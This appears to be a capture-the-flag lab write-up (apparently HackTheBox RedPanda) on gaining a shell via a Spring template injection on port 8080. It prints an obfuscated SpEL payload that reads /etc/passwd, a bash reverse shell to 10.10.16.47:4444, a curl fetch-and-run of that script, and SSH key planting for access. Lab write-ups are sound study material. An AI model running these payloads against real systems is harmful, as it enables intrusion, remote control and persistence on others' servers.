# Exploitation RCE port 8080

Knowing it's possible to execute commands in the server, find a way to access it.

Apparently when retrieving the `/etc/passwd` it was done using an approach in which every character of a given command is transformed into Unicode and concatenated with the rest to form the whole word.

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

To execute other commands take the same approach.

I followed these steps:

1. Create a reverse shell bash script

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.47/4444 0>&1"
```

2. Try using curl to fetch the file to the server

On my machine

```bash
python -m http.server
```

Then construct the payload as mentioned above (refer to [this](https://vato.cc/hackthebox-writeup-redpanda/) for that matter) in the server to execute

```bash
curl http://10.10.16.47:8000/shell.sh --output /tmp/shell.sh
```

3. Grant permissions to execute the script in the server

```bash
chmod +x /tmp/shell.sh
```

4. Receive the connection

Set up a listener and then execute

```bash
/tmp/shell.sh
```

In the server.

I obtained a reverse shell.

![[rev_shell.png]]

For comfort I passed my public SSH key to the server and then logged in.

![[ssh.png]]

[[Vulnerability assessment server machine]]
